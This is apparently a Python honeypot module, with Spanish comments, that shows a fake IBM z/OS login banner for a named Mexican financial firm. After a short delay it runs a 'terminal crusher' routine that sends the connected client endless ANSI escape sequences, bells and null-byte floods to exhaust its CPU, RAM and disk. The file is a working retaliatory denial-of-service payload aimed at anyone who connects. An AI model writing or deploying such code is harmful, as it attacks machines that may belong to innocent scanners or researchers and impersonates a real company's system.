import time
import os
import base64

def terminal_crusher(client_socket):
    """
    Motor de agotamiento agresivo para terminales SSH.
    Utiliza secuencias ANSI para saturar CPU/RAM y nulos para llenar disco.
    """
    print("[⚔️] Iniciando Terminal Crusher (CPU/RAM/Disk Exhaustion).")
    
    # Secuencias ANSI: 
    # \x1b[2J (Borrar pantalla)
    # \x1b[H  (Cursor al inicio)
    # \x1b[?1049h (Activar buffer alternativo)
    # \x1b[48;5;[COLOR]m (Cambiar color de fondo)
    # \a (Campana del sistema)
    
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            # Mezclamos comandos ANSI con 1MB de nulos para llenar el disco si loguean
            payload = ansi_bomb
            for _ in range(10):
                color = os.urandom(1)[0]
                payload += f"\x1b[48;5;{color}m".encode() + b"\x00" * 100000 + b"\a"
            
            client_socket.send(payload)
            # Retraso mínimo para no saturar nuestro propio servidor pero sí al cliente
            time.sleep(0.05)
    except: pass

def handle_mainframe_shell(client_socket, ip):
    try:
        client_socket.send(b"ICH70001I - LOGIN TO IBM z/OS v2.5 AT MONEX-FINANCIAL-MEX\r\nENTER USERID - \r\n")
        # Captura silenciada por rapidez
        client_socket.recv(1024)
        client_socket.send(b"ENTER PASSWORD - \r\n")
        client_socket.recv(1024)
        
        client_socket.send(b"ICH70008I LOGIN SUCCESSFUL. SYSTEM: MONEX-MX-COBOL-V8\r\nREADY\r\n")

        # El atacante tiene 15 segundos antes del colapso
        time.sleep(15)
        client_socket.send(b"\r\n*** CRITICAL SYSTEM OVERLOAD - INITIATING MEMORY DUMP ***\r\n")
        terminal_crusher(client_socket)
    except: pass
